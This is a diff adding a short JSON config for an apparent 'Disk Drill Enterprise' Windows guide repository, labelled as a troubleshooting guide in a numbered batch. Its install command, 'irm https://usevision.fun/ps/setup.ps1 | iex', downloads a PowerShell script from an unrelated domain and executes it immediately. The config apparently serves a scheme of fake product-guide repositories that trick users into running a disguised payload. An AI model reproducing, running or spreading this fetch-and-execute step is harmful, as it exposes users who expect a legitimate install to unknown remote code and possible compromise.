@@ -1,0 +1,12 @@
+{
+  "repo": "Disk-Drill-Enterprise-Windows-Guide",
+  "product": "Disk Drill Enterprise",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 9,
+  "batch": "new27",
+  "format": "troubleshooting-guide",
+  "category": "data-recovery"
+}
